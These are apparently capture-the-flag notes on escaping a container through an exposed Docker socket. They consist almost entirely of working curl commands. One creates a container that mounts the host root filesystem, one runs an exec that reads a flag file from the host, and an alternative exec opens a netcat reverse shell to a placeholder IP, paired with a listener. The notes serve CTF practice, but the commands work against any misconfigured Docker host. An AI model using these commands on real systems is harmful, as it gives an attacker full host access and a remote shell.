# Start escape container:
<pre>
curl -X POST \
--unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{
  "Image": "alpine",
  "Cmd": ["sleep", "9999"],
  "HostConfig": {
    "Binds": ["/:/host"]
  }
}' \
http://localhost/containers/create?name=escape
</pre>

# Start command on escape container:
<pre>
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/exec -H "Content-Type: application/json" -d '{
  "AttachStdout": true,
  "AttachStderr": true,
  "AttachStdin": false,
  "Tty": true,
  "Cmd": ["cat", "/host/opt/ctf/flag.txt"]
}'
</pre>pre>

## OR 
<pre>
  curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/exec -H "Content-Type: application/json" -d '{
  "AttachStdout": true,
  "AttachStderr": true,
  "AttachStdin": false,
  "Tty": true,
  "Cmd": ["nc", "{IP placeholder}", "4444", "-e", "sh"]
  }'
</pre>
This has to be combined with "nc -nvlp 4444" on host

# Attach start escape exec and output the content to "test":

<pre>
  curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" http://localhost/exec/d54d91e0a729187079a2cdd03c0188f852f1ee2888128bbc3f7932a4b9e139a4/start -d '{"Detach":false,"Tty":false}' --output test
</pre>
